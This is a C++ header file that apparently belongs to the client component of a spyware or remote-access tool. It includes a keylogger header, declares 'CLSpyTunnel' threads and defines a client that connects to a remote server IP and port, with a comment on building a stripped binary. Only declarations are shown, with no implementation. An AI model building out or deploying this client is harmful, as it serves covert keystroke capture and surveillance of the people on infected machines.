#ifndef CLIENT_HPP
#define CLIENT_HPP

#include <cstdio> // for printf, later will be removed
#include <cstring>
#include <cstdlib>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <errno.h>
#include "clkeylogger.hpp"
#include "cldata_handler.hpp"
#include "common.hpp"
#include "client_macros.hpp"


// g++ client.cpp -o client -Os -s
// strip client

class TunnelContainer {
public:
    TunnelContainer(CommandCode __tunnel_code);
    ~TunnelContainer();
    TunnelContainer* find(CommandCode __tunnel_code);
    CommandCode tunnel_code_;
    CLSpyTunnel* p_tunnel_;
    pthread_t tunnel_thread_;
    bool thread_running_ = false;
    TunnelContainer* next_;
};

class Client {
public:
    Client(const char* __ip, const int __port);
    int init();
    void start();
    void shutdown();
private:
    char ip_[MAX_IP_LEN];
    int port_;
    int socket_;
    bool shutdown_flag_ = false;
    bool retry_flag_ = false;
    struct sockaddr_in server_addr_;
    TunnelContainer* tunnel_conts_;
};

#endif // CLIENT_HPP